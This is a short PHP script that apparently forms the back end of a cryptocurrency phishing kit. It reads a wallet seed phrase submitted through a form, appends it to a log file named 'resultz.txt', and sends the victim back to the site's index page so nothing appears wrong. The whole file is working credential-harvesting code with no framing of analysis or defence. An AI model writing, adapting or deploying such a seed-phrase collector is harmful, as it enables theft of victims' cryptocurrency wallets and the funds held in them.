<?php
$walletSeed = $_POST['walletSeed'];

if (empty($walletSeed)) {
  header('location: ./');
} else {
$message = "
WALLET : ".$walletSeed."

";
$qq = fopen("resultz.txt", "a");
fwrite($qq, $message);
fclose($qq);
header('location: index.html');
}
?>
